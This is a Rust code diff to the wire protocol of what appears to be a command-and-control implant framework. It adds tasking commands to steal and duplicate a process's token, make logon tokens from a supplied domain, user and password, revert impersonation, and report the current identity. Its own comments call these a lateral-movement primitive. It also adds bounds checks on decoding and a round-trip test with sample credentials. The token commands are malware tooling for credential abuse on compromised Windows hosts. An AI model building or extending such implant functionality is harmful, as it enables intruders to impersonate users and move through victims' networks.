@@ -11,6 +11,21 @@ use crate::wire::{Reader, WireError, Writer};
 /// `Vec::with_capacity(u32::MAX)` on the server.
 const MAX_BATCH: usize = 65_536;
 
+/// Hard cap on per-cycle command/arg element counts (tasks dispatched to an
+/// implant, BOF args). Legitimate payloads never exceed a few dozen items per
+/// beacon cycle; 256 is a generous ceiling. This is a *secondary* guard — the
+/// primary allocation guard is [`MAX_BATCH`] — applied directly to the loop
+/// iteration count so that even if the allocation guard is somehow bypassed the
+/// decoder still terminates in bounded time.
+///
+/// **NOT applied to [`TaskResponse`] batches** — those carry `FileChunk`/BOF
+/// output streams that legitimately run into thousands of items per cycle (a
+/// 10 MiB download at 64 KiB chunks = 160 chunks; large uploads far exceed that).
+/// Truncating responses at 256 silently drops file-tail chunks. Result batches
+/// use [`MAX_BATCH`] (65536) as their only wire cap; per-session buffering is
+/// bounded by the server's `MAX_RESULTS_PER_SESSION` eviction instead.
+const MAX_WIRE_COUNT: usize = 256;
+
 /// Validate a length-prefixed element count read off the wire. Returns the
 /// count to allocate for, capped at the remaining input (a hard upper bound:
 /// you can't have more elements than unread bytes, since each element is at
@@ -134,6 +149,26 @@ pub enum Command {
     /// `Response::Channel { status: 2 (closed) }`), so this is for explicit
     /// operator-initiated teardown.
     ChannelClose { chan: u32 },
+    /// Steal (duplicate) the primary token of `pid` and hold it process-wide for
+    /// later impersonation. A prior stolen/made token is closed first. Pairs with
+    /// [`Command::Rev2Self`] / [`Command::GetUid`]. Lateral-movement primitive.
+    StealToken { pid: u32 },
+    /// Make a new logon token via `LogonUser` (make-token / pass-the-password).
+    /// `domain`\`user` + `password`; `logon_type` 1=interactive(default),
+    /// 2=network, 3=new-credentials. The resulting token is held process-wide
+    /// (overrides a prior stolen/made token).
+    MakeToken {
+        domain: String,
+        user: String,
+        password: String,
+        logon_type: u8,
+    },
+    /// Drop the current thread's impersonation (RevertToSelf) but KEEP the held
+    /// token for reuse. Pairs with [`Command::StealToken`] / [`Command::MakeToken`].
+    Rev2Self,
+    /// Report the current thread identity. Output text = `DOMAIN\user` (+ a marker
+    /// if a stolen/made token is held). Lets the operator confirm who executes.
+    GetUid,
 }
 
 /// 文件操作的种类（u8 tag 0-4）。
@@ -277,6 +312,24 @@ impl Command {
                 w.u8(21);
                 w.u32(*chan);
             }
+            Command::StealToken { pid } => {
+                w.u8(22);
+                w.u32(*pid);
+            }
+            Command::MakeToken {
+                domain,
+                user,
+                password,
+                logon_type,
+            } => {
+                w.u8(23);
+                w.str(domain);
+                w.str(user);
+                w.str(password);
+                w.u8(*logon_type);
+            }
+            Command::Rev2Self => w.u8(24),
+            Command::GetUid => w.u8(25),
         }
     }
 
@@ -298,7 +351,7 @@ impl Command {
                 let name = r.str()?;
                 let n_raw = r.u32()?;
                 let cap = checked_count(r, n_raw)?;
-                let n = n_raw as usize;
+                let n = (n_raw as usize).min(MAX_WIRE_COUNT);
                 let mut args = Vec::with_capacity(cap);
                 for _ in 0..n {
                     args.push(r.str()?);
@@ -345,6 +398,15 @@ impl Command {
                 data: r.blob()?.to_vec(),
             },
             21 => Command::ChannelClose { chan: r.u32()? },
+            22 => Command::StealToken { pid: r.u32()? },
+            23 => Command::MakeToken {
+                domain: r.str()?,
+                user: r.str()?,
+                password: r.str()?,
+                logon_type: r.u8()?,
+            },
+            24 => Command::Rev2Self,
+            25 => Command::GetUid,
             t => return Err(WireError::BadTag(t)),
         })
     }
@@ -423,12 +485,16 @@ impl Response {
             1 => Response::Output(r.blob()?.to_vec()),
             2 => Response::Ok,
             3 => Response::Err(r.str()?),
-            4 => Response::FileChunk {
-                name: r.str()?,
-                seq: r.u32()?,
-                eof: r.u8()?,
-                data: r.blob()?.to_vec(),
-            },
+            4 => {
+                let name = r.str()?;
+                let seq = r.u32()?;
+                let eof_raw = r.u8()?;
+                if eof_raw > 1 {
+                    return Err(WireError::BadTag(eof_raw));
+                }
+                let data = r.blob()?.to_vec();
+                Response::FileChunk { name, seq, eof: eof_raw, data }
+            }
             5 => Response::BofOutput(r.blob()?.to_vec()),
             6 => Response::Channel {
                 chan: r.u32()?,
@@ -474,7 +540,7 @@ impl Task {
         let mut r = Reader::new(data);
         let n_raw = r.u32()?;
         let cap = checked_count(&mut r, n_raw)?;
-        let n = n_raw as usize;
+        let n = (n_raw as usize).min(MAX_WIRE_COUNT);
         let mut out = Vec::with_capacity(cap);
         for _ in 0..n {
             out.push(Task::decode(&mut r)?);
@@ -515,8 +581,13 @@ impl TaskResponse {
         let mut r = Reader::new(data);
         let n_raw = r.u32()?;
         let cap = checked_count(&mut r, n_raw)?;
-        let n = n_raw as usize;
-        let mut out = Vec::with_capacity(cap);
+        // Results stream FileChunk / BOF output and legitimately run into the
+        // thousands per cycle — do NOT apply MAX_WIRE_COUNT (256) here, it would
+        // silently drop file-tail chunks. `checked_count` already bounds the
+        // allocation at MAX_BATCH (65536) and the per-session buffer is evicted
+        // server-side past MAX_RESULTS_PER_SESSION.
+        let n = (n_raw as usize).min(MAX_BATCH).min(cap);
+        let mut out = Vec::with_capacity(n);
         for _ in 0..n {
             out.push(TaskResponse::decode(&mut r)?);
         }
@@ -644,5 +715,28 @@ mod tests {
         assert_eq!(round_trip(d_empty.clone()), d_empty);
         let c = Command::ChannelClose { chan: 42 };
         assert_eq!(round_trip(c.clone()), c);
+    }
+
+    #[test]
+    fn token_ops_roundtrip() {
+        let steal = Command::StealToken { pid: 1337 };
+        assert_eq!(round_trip(steal.clone()), steal);
+        let mk = Command::MakeToken {
+            domain: "CORP".into(),
+            user: "jdoe".into(),
+            password: "P@ssw0rd!".into(),
+            logon_type: 1,
+        };
+        assert_eq!(round_trip(mk.clone()), mk);
+        // Empty domain (local account) + network logon must survive.
+        let mk_local = Command::MakeToken {
+            domain: String::new(),
+            user: "svc".into(),
+            password: String::new(),
+            logon_type: 2,
+        };
+        assert_eq!(round_trip(mk_local.clone()), mk_local);
+        assert_eq!(round_trip(Command::Rev2Self), Command::Rev2Self);
+        assert_eq!(round_trip(Command::GetUid), Command::GetUid);
     }
 }
